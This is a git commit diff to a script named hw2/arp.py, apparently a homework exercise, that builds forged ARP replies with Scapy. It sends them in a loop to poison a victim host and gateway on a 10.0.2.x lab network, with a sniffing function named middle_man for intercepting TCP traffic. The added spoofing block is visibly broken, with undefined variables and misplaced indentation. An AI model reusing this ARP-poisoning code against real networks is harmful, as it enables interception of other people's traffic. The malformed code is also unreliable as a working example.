2003af866d1552131029427d83e9204213f4aba0
q40603 <q40603@gmail.com>
2020-05-07 10:23:03 +0800

    mac

--- hw2/arp.py
+++ hw2/arp.py
@@ -7,7 +7,7 @@ from uuid import getnode
 
 def arp():
 	mac = getnode()
-	mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
+	attacker_mac = ':'.join(("%012X" % mac)[i:i+2] for i in range(0, 12, 2))
 
 	stream = os.popen('arp -a')
 
@@ -22,17 +22,25 @@ def arp():
 		vmac.append(line[3])
 		lines = stream.readline()
 
+	print(vip,vmac)
+
 	p = []
 	# for i in range(len(vip)):
-	p.append(Ether(dst='00:0c:29:e4:f0:86', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
-		hwdst='00:0c:29:e4:f0:86', hwsrc=mac, op=2))
+	p.append(Ether(dst='08:00:27:f1:c3:95', src=attacker_mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
+		hwdst='08:00:27:f1:c3:95', hwsrc=mac, op=2))
 	for i in range(10):
 		print('send arp ', i)
-		sendp(Ether(dst='00:0c:29:e4:f0:86', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
-		hwdst='00:0c:29:e4:f0:86', hwsrc=mac, op=2))
-		sendp(Ether(dst='00:50:56:c0:00:08', src=mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
-		hwdst='00:50:56:c0:00:08', hwsrc=mac, op=2))
+		sendp(Ether(dst='08:00:27:f1:c3:95', src=mac)/ARP(pdst='10.0.2.4', psrc='10.0.2.1', 
+		hwdst='08:00:27:f1:c3:95', hwsrc=mac, op=2))
+		sendp(Ether(dst='52:54:00:12:35:00', src=mac)/ARP(pdst='10.0.2.1', psrc='10.0.2.4', 
+		hwdst='52:54:00:12:35:00', hwsrc=mac, op=2))
 		time.sleep(0.1)
+
+spoof_vic_pkt = Ether(src=attacker_mac,dst=vic_mac)/ARP(psrc=ap_ip, pdst=vic_ip,hwsrc=attacker_mac, op=2)	
+		sendp(spoof_vic_pkt)
+		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
+		sendp(spoof_ap_pkt)
+
 
 def middle_man():
 	s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
